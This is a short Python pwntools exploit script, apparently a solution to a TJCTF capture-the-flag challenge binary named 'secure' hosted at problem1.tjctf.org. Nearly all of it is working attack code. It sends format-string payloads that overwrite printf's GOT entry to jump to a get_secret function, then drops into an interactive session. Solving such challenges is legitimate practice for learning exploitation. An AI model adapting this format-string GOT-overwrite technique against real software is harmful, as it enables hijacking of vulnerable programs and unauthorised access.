#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
#context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./secure')
else:
	io = remote('problem1.tjctf.org', 8008)

elf = ELF('./secure')

def DEBUG():
	raw_input("DEBUG :")
	gdb.attach(io)

def send_message(payload):
	
	io.sendlineafter('> ','666')
	
	io.sendlineafter('> ',payload)
	
	io.sendlineafter('> ','666')
	

def loop_it():
	
	main_addr = elf.symbols['main']
	exit_got = elf.got['exit']
#print "[+]exit_got = {}".format(hex(exit_got))
	payload = p32(elf.got['printf']) + '%' + str((main_addr&0xffff)-4) + 'c%35$hn'
	
	info(payload)
	send_message(payload)

def get_flag():

	flag_addr = elf.sym['get_secret']
	
#	payload = p32(elf.got['printf']) + '%' + str((flag_addr&0xffff)-4) + 'c' + '%35$hn'
	payload = fmtstr_payload( 35, {elf.got['printf']:flag_addr} )
	send_message(payload)
	io.recv()
	
if __name__ == '__main__':

	#loop_it()
#	DEBUG()
	get_flag()
	io.interactive()
